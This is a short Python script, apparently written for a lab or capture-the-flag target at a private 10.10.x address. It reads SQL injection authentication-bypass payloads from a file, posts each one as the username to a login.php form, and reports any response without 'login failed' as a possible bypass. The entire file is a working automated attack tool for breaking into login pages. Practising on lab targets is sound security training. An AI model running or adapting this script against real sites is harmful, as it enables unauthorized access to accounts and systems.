#!/usr/bin/env python3

import requests

def load_payloads(file_path):
    """Reads and returns the payloads from a file."""
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f'[-] File not found: {file_path}')
        return []

def send_request(payload, url, headers, allow_redirects):
    """Sends a POST request with the given payload."""
    data = {
        'username': payload,
        'password': 'pass'
    }
    response = requests.post(url, data=data, headers=headers, allow_redirects=False)
    return response

def main():
    target_url = 'http://10.10.138.157/login.php'
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    payloads = load_payloads('Auth_Bypass.txt')
    if not payloads:
        return

    print(f'[*] Testing {len(payloads)} payload(s)...')
    for payload in payloads:
        response = send_request(payload, target_url, headers, allow_redirects=False)
        
        response_text = response.text.lower()

        if "login failed" not in response_text:
            print(f'[+] Possible SQLi detected with payload: "{payload}"')
            
if __name__ == '__main__':
    main()
